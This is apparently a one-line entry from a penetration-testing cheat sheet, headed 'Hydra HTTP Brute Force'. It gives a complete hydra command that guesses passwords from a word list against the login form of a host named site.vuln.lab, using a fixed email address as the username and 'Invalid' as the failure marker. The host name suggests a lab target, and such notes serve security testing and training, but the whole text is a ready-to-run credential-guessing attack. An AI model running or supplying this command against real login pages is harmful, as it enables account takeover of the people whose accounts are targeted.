## Hydra HTTP Brute Force
```
hydra -l janis@mail.com -P ./passwords.txt site.vuln.lab http-post-form "/Account/Login/:Email=^USER^&Password=^PASS^:F=Invalid"
```